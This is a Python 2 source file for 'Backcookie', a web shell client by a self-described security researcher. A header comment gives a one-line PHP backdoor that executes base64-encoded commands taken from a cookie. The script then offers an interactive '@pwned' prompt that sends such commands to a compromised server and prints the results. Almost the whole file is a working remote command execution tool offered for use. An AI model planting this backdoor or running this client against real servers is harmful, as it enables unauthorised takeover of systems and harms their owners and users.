#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2013 - 2014 @mrjopino  <mrjopino@gmail.com>
#    
# 
###############################################
import os                                     #
import sys                                    #
import optparse                               #
from sys import argv                          #
from urllib2 import build_opener, HTTPHandler #
############################################################################
#                                                                          #
# Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> ###
# It goes with a range from 1 to 0, but you can customize the parameter.     #
# Example: python -u backcookie.py http://target.com/shell.php -c name_cokie #
#                                                                          ###
# You can change the name of the cookie, in option -c.                     #
# a value of 1 for the name of your cookie, also in php.                   #
# Example: system(base64_decode($_COOKIE["yourcookie"]));                  #####
# so that the connection is successful.                                        #
#                                                                              #
# Backcookie is like the people who finds the love of his life every 2 months. #
################################################################################
#
#BackCookie
#
if "linux" in sys.platform:
	os.system("clear")
elif "win" in sys.platform:
	os.system("cls")
else:
    pass

_version_ = "1.0.2"

# colors
class color:
    blue = '\033[94m'
    red = '\033[91m'
    green = '\033[92m'
    white = '\033[0m'
    yellow = '\033[93m'

# class of header and encode
class core:
    bc = 'Backcookie'
    ua = 'User-Agent'
    ck = 'Cookie'
    vc = '={0}'
    eb = 'base64'

def Error():
	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
	print "\t\t+             Status              +"
	print "\t\t+             sorry :(            +"
	print "\t\t-----------------------------------\n\n"
	print color.blue + "[-] " + color.red  + "Error:" +  color.yellow + " " + "Connection! \n" + color.white
	exit(0)

def backcookie(command,host,cookie,vcmd,debugLevel=0):
	o = build_opener(HTTPHandler(debuglevel=debugLevel))
	o.addheaders = [
		(core.ua, "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1)"),
		(core.ck, cookie + core.vc.format(command.encode(core.eb)))
	]
	try:
		l = o.open(host)
		v = l.headers.values() # v > validate
	except:
		Error()
	if v[0] == '0' or vcmd == "command": # vcmd > validate command
		print color.blue + l.read().strip() + color.white
	else:
		Error()

def shell(host,cookie):
	backcookie("cd",host,cookie,"")
	print color.white + "\t\t-------------" + color.red + core.bc + color.white + "------------"
	print "\t\t+    Developed by: @mrjopino      +"
	print "\t\t+             To play             +"
	print "\t\t-----------------------------------\n\n"
	print color.green + "[+] " + color.blue  + "Happy hacking" + color.white
	print color.green + "[+] " + color.blue  + "Sometimes it is not positive, but sometimes if!\n" + color.white

	while True:

		command = raw_input("@" + "pwned:~$ ")
		if command != "binfo": #Information of conecction!
			backcookie(command,host,cookie,"command")
		else:
			print "\n"
			print color.yellow + "[*] " + color.green  + "Information" + color.white
			print color.yellow + "[!] " + color.blue  + "Target: " + host + color.white
			print color.yellow + "[!] " + color.blue  + "Cookie: " + cookie + color.white
			print "\n"

		command = raw_input("@" + "pwned:~$ ")
		if command != "exit": #exit console backcookie
			backcookie(command,host,cookie,"command")
		else:
			print "\t\t-------------" + color.blue + "Developer" + color.white + "------------"
			print "\t\t+        José Pino (Fraph)       +"
			print "\t\t+       Security researcher      +"
			print "\t\t+            @mrjopino           +"
			print "\t\t----------------------------------\n\n"
			print color.green + "[!] " + color.blue + "Version:" + " " + color.yellow + _version_ + color.white
			print color.blue + "[-] " + color.red + core.bc + " OFF\n" + color.white
			break

def main():
	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.2")
	parser.add_option('-u', dest="Url", type="string", help="specify hostname to run on")
	parser.add_option('-c', dest="Cookie", type="string", help="specify Cookie")
	(options, args) = parser.parse_args()
	host = options.Url
	cookie = options.Cookie
	if host and cookie:
		shell(host,cookie)
	else:
		parser.print_help()
		exit(0)

if __name__ == "__main__":
        try:
        	main()
        except KeyboardInterrupt:
        	sys.exit(color.blue + "\n\n[-] " + color.green + "Status: " + color.red + "close!\n" + color.white) #Ctrl + c = close
                pass
                ve = (command,core) #View error of obj
        except Exception as ke:
        	sys.exit(color.red + "Error: " + color.blue + "%s" % ke + color.white) #Result of error
